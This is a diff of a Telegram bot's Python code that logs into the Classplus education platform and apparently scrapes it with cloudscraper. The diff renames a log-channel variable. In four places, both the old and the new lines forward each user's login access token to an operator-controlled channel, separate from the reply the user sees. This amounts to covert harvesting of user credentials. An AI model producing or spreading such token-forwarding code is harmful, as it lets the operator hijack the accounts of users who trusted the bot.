@@ -14,7 +14,7 @@ import concurrent.futures
 import re
 from config import CHANNEL_ID
 
-log_channel = CHANNEL_ID
+PREMIUM_LOGS = CHANNEL_ID
 
 apiurl = "https://api.classplusapp.com"
 s = cloudscraper.create_scraper() 
@@ -92,7 +92,7 @@ async def classplus_txt(app, message):
                             token = verify_data['data']['token']
                             s.headers['x-access-token'] = token
                             await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
-                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
+                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                             
 
                             headers = {
@@ -139,7 +139,7 @@ async def classplus_txt(app, message):
                             s.headers['x-access-token'] = token
                         
                             await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
-                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
+                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                     
                     elif verify_response.status_code == 409:
 
@@ -171,7 +171,7 @@ async def classplus_txt(app, message):
                             s.headers['x-access-token'] = token
                         
                             await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
-                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
+                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                             
 
                             headers = {
@@ -220,7 +220,7 @@ async def classplus_txt(app, message):
                             s.headers['x-access-token'] = token
                         
                             await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
-                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
+                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                             
 
                             headers = {
